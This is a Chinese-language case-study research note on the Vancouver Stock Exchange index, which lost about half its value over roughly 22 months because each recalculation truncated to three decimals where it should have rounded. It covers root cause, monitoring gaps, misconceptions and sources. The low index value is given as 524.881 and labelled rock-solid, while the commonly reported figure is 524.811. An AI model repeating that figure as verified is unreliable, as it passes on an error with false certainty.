- **技術根因（精確）**: 指數每次因成交而重算時，程式以 **truncation（截斷，floor()）** 取代 **rounding（四捨五入，round()）** 取到小數第三位。單次截斷誤差極小（最多約 0.0005），但指數**每天重算數千次**，且每次截斷都是**系統性向下**（floor 永遠往下捨），誤差**單向累積、不會抵消**。約 22 個月下來累積出約 −485 點的偏差。根因是「一行用錯函式」（floor vs round），但本質是**單向偏差在高頻重算下的線性累積**——沒有任何一次計算「錯得明顯」，每一步看起來都對。
- **防禦的孔洞（Swiss-cheese holes）**:
  - 監控全綠（latent/F11）：指數每天都產出「合理」的數字，沒有崩潰、報錯或不連續；沒有人盯「它與真值的偏差」這個量，因為沒人想到要盯。
  - 單向誤差無自我修正（latent/F8）：若用 round()，誤差會上下抵消、長期趨近零；用 floor() 讓誤差**只往一個方向**，是「靜默漂移」的關鍵。
  - 缺乏對拍／重算驗證（F3）：沒有定期用獨立方法（完整重算、與成分股市值對帳）驗證指數值的機制，使偏差能潛伏近兩年。
  - 「看起來對」掩蓋「實際錯」（F9/F11）：顯示三位小數的精度給人精確的錯覺，掩蓋了系統性偏差。
- **官方調查 / 關鍵結論 + URL**: 無政府事故調查（非安全事故）。權威技術整理：Technical University of Munich（Huckle）案例頁 <https://www5.in.tum.de/~huckle/Vancouv.pdf> ；學術分析常引 B. D. McCullough 對數值計算誤差的討論；當代報導見 Toronto Star 1983-11。中心教訓：**單向 round-off 誤差在高頻重算下會線性累積成巨大偏差，而「監控正常」完全看不見它。**
- **常見誤解 / 要校準的迷思**:
  - 「就是個四捨五入的小誤差」：錯——關鍵不是「誤差小」，是「**單向＋高頻累積**」。用 round()（雙向）不會漂；用 floor()（單向）才會。
  - 「市場真的崩了一半」：錯——市值與成分股從沒變，是**指數這個衡量儀器**默默讀錯了。真實世界沒事、儀表錯了，這正是「靜默資料損毀」的本質：壞的是你對世界的量測，不是世界。
  - 「很快就被發現」：錯——潛伏約 **22 個月**，沒有警報、沒有崩潰，只能靠有人起疑去獨立重算才會發現。
- **信心**: ✔ rock-solid（1000→524.881→1098.892、floor vs round、約 22 個月、每日數千次重算皆多源一致）。可安全作為「靜默資料損毀／單向誤差累積」主案；後端對照（bit rot / silent data corruption、split-brain 多叢集獨立寫入致狀態分歧、需 checksum/quorum/fencing/對帳）為通用工程知識，章內可自由發揮、不需釘單一來源。

<!-- 第二輪增補：H 段案例 26–33。第三輪增補：I 段案例 34（VSE，靜默資料損毀）。2026-06-13。 -->
